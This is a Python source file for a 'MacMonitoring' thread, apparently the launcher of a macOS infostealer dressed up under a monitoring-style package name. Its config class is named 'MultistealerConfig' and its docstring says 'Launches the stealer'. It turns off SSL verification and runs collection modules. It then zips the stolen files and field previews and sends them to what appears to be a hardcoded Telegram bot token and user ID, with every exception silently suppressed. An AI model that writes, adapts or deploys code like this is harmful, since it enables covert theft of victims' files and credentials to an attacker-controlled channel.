import ssl
from sys import argv
from time import sleep
from typing import List, Any
from threading import Thread
from multiprocessing import Pool

from systoring.macosmonitoring.helpers import functions
from systoring.macosmonitoring.helpers.config import MultistealerConfig
from systoring.macosmonitoring.helpers.storage import MemoryStorage
from systoring.macosmonitoring.modules.ws import WS
from systoring.macosmonitoring.senders.te import TE

class MacMonitoring(Thread):
    def __init__(
        self,
        delay: int = 0
    ):
        Thread.__init__(self, name="Mac Monitoring")
        self.__config = MultistealerConfig()
        self.__storage = MemoryStorage()

        self.__methods = [
            {
                "object": WS,
                "arguments": (
                    "WS",
                ),
                "status": True
            }
        ]
        self.__delay = delay
        self.__senders = [TE(token="7640963418:AAEjQ0YxL2oqnhhwVC0GNSQANGQFv6Yp7GE", user_id=586901167)]

    def run(self) -> None:
        """
        Launches the stealer.windows.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            sleep(self.__delay)

            ssl._create_default_https_context = ssl._create_unverified_context

            with Pool(processes=self.__config.PoolSize) as pool:
                results = pool.starmap(functions.run_process, [
                    (method["object"], method["arguments"]) for method in self.__methods if method["status"] is True
                ])
            pool.close()

            data = self.__storage.create_zip([file for data in results if data for file in data.files])
            preview = self.__storage.create_preview([field for data in results if data for field in data.fields])

            for sender in self.__senders:
                sender.run(self.__config.ZipName, data, preview)

        except Exception as e:
            pass